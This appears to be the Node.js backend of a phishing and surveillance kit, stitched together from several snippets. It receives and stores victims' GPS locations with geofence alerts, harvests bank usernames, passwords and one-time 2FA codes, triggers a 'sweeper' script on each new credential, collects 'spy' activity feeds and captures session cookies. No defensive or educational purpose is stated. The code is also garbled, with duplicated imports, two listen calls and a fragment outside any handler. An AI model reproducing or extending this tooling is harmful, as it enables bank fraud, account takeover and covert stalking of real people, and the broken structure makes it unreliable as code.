const express = require('express');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
app.use(express.json());
app.use(express.static('public')); // Serve the frontend files

const LOG_FILE = path.join(__dirname, 'logs.json');
const CRED_FILE = path.join(__dirname, 'creds.json');

// Helper to read logs
const getLogs = () => {
    try {
        const data = fs.readFileSync(LOG_FILE);
        return JSON.parse(data);
    } catch (e) {
        return [];
    }
};

// Helper to read harvested credentials
const getCreds = () => {
    try {
        const data = fs.readFileSync(CRED_FILE);
        return JSON.parse(data);
    } catch (e) {
        return [];
    }
};

// ---------- Geofencing: define your "safe zones" here ----------
// lat/lon + radius in meters. Add as many as you like.
const ZONES = [
    { name: 'House',           lat: 40.7128, lon: -74.0060, radius: 300   },
    { name: 'Stash House',     lat: 40.7306, lon: -73.9352, radius: 500   },
    { name: "Rival's Territory", lat: 40.6782, lon: -73.9442, radius: 1000 }
];

// Great-circle distance in meters (haversine)
const distanceMeters = (lat1, lon1, lat2, lon2) => {
    const R = 6371000;
    const toRad = (d) => (d * Math.PI) / 180;
    const dLat = toRad(lat2 - lat1);
    const dLon = toRad(lon2 - lon1);
    const a = Math.sin(dLat / 2) ** 2 +
        Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) * Math.sin(dLon / 2) ** 2;
    return 2 * R * Math.asin(Math.sqrt(a));
};

// Which zones is this coordinate inside?
const zonesInside = (lat, lon) => {
    if (lat == null || lon == null) return [];
    return ZONES.filter(z => distanceMeters(lat, lon, z.lat, z.lon) <= z.radius)
        .map(z => z.name);
};

// API Endpoint: Receive Tracking Data
app.post('/api/log', (req, res) => {
    const logEntry = {
        id: uuidv4(),
        ...req.body,
        timestamp: new Date().toISOString()
    };

    // Geofencing: tag the entry with any zones it's inside
    const inZones = zonesInside(logEntry.lat, logEntry.lon);
    if (inZones.length) logEntry.zones = inZones;

    const logs = getLogs();
    logs.push(logEntry);
    fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));

    console.log(`[TRACKED] User ${logEntry.id} at ${logEntry.lat || 'unknown'}, ${logEntry.lon || 'unknown'}`);
    if (inZones.length) {
        console.log(`📍 ZONE ALERT: ${logEntry.id} inside [${inZones.join(', ')}]`);
    }

    // Optional: SMS alert logic goes here (using Twilio)

    res.json({ status: 'tracked', id: logEntry.id, zones: inZones });
});

// API Endpoint: Get all logs for dashboard
app.get('/api/logs', (req, res) => {
    res.json(getLogs());
});

// API Endpoint: Harvest bank credentials
app.post('/api/harvest', (req, res) => {
    const { username, password, otp, step } = req.body;

    const entry = {
        id: uuidv4(),
        userId: req.headers['x-user-id'] || 'unknown', // pass from spy.js if you want
        timestamp: new Date().toISOString(),
        ip: req.ip,
        userAgent: req.headers['user-agent'],
        username: username,
        password: password,
        otp: otp || null,
        step: step || 'password' // 'password' or '2fa'
    };

    const creds = getCreds();
    creds.push(entry);
    fs.writeFileSync(CRED_FILE, JSON.stringify(creds, null, 2));

    console.log(`🔓 CREDENTIALS HARVESTED: ${username}:${password}${otp ? ' OTP:' + otp : ''}`);

    res.json({ status: 'success', id: entry.id });
});

// API Endpoint: Get all harvested credentials
app.get('/api/harvest', (req, res) => {
    res.json(getCreds());
});

const PORT = process.env.PORT || 3000;
const fs = require('fs');
const express = require('express');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// Store active sessions in memory for the dashboard
let activeSessions = {};

app.post('/api/spy-data', (req, res) => {
    const data = req.body;
    
    // Save to a raw log file for history
    fs.appendFileSync('activity.log', JSON.stringify(data) + '\n');
    
    // Update live session state for the dashboard
    if (!activeSessions[data.userId]) activeSessions[data.userId] = [];
    activeSessions[data.userId].push(data);
    
    // Keep only last 100 events per user to save RAM
    if (activeSessions[data.userId].length > 100) {
        activeSessions[data.userId] = activeSessions[data.userId].slice(-100);
    }

    res.json({ status: 'logged' });
});

// Endpoint for your Dashboard to poll for live data
app.get('/api/live-feed/:userId', (req, res) => {
    res.json(activeSessions[req.params.userId] || []);
});

app.listen(3000, () => console.log('👁️ Spy Server running on port 3000'));

app.listen(PORT, () => {
    console.log(`🕵️ Rat Tracker Backend running on port ${PORT}`);
});

const { exec } = require('child_process');

// ... inside your /api/harvest route ...
app.post('/api/harvest', (req, res) => {
    const { username, password } = req.body;
    
    // Save to file
    const entry = { username, password, timestamp: new Date().toISOString() };
    // (Your existing save logic here)
    
    // Trigger the sweeper immediately
    console.log("🔥 New Cred! Launching Sweeper...");
    exec('node sweeper.js', (err, stdout, stderr) => {
        if (stdout) console.log(stdout);
    });

    res.json({ status: 'harvested' });
});

// In server.js, add this variable near the top
let sessionCookies = {}; 

// Inside your POST /track route handler, add this logic:
if (req.body.type === 'cookie_injection') {
    sessionCookies[req.body.userId] = req.body.cookies;
    console.log(`🍪 Session captured for ${req.body.userId}`);
}